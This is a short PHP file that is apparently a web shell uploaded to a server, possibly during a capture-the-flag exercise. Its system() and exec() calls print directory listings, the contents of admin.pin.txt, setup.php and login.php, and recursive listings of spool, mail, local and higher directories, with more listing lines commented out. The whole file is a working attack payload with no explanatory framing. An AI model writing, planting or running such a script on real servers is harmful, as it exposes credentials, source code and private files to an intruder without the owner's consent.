<?php 
echo system('ls');
echo "here is for txt !!!!!  \n";
echo system('cat admin.pin.txt');
echo "here is for setup  \n";
echo system('cat setup.php');
echo "last \n";
echo system('ls ..');
echo exec('ls ..');
echo system('ls');
// echo system('cat refresh.html');
echo system('cat login.php');
echo file_get_contents('setup.php');
echo system('ls ../..');
// echo system('cd ../../backups; ls -R');
// echo system('cd ../../cache; ls -R');
// echo system('cd ../../lib; ls -R');
// echo system('cd ../../lock; ls -R');
echo system('cd ../../local; ls -R');
echo "lastlaslastlastlasllastalsta";
// echo system('cd ../../log; ls -R');
echo system('cd ../../spool; ls -R');
echo "lastlaslastlastlasllastalsta";
echo system('cd ../../mail; ls -R');
echo "lastlaslastlastlasllastalsta";
echo system('cd ../../..; ls -R');
// echo system('cd ../../spool; ls -LR');
?>
